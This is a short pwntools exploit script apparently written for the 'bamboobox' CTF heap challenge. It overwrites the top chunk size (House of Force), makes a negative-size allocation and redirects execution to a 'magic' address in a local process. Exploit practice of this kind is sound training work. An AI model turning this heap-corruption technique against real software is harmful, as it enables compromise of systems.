#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

io = process('./bamboobox')
context.log_level = 'debug'

magic = 0x400d49

def show():
    io.sendlineafter("Your choice:",'1')

def add(length,name):
    io.sendlineafter("Your choice:",'2')
    io.sendlineafter("Please enter the length of item name:",str(length))
    io.sendlineafter("Please enter the name of item:",name)

def change(idx,length,name):
    io.sendlineafter("Your choice:",'3')
    io.sendlineafter("Please enter the index of item:",str(idx))
    io.sendlineafter("Please enter the length of item name:",str(length))
    io.sendlineafter("Please enter the new name of the item:",name)

def remove(idx):
    io.sendlineafter("Your choice:",'4')
    io.sendlineafter("Please enter the index of item:",str(idx))

def exit():
    io.sendlineafter("Your choice:",'5')

add(0x30,'aaaa')
payload = 'a'*0x30 + p64(0) + p64(0xffffffffffffffff)
change(0,len(payload),payload)

add(-0x70,'aaaa')
add(0x10,p64(0)+p64(magic))
gdb.attach(io)
exit()

io.interactive()
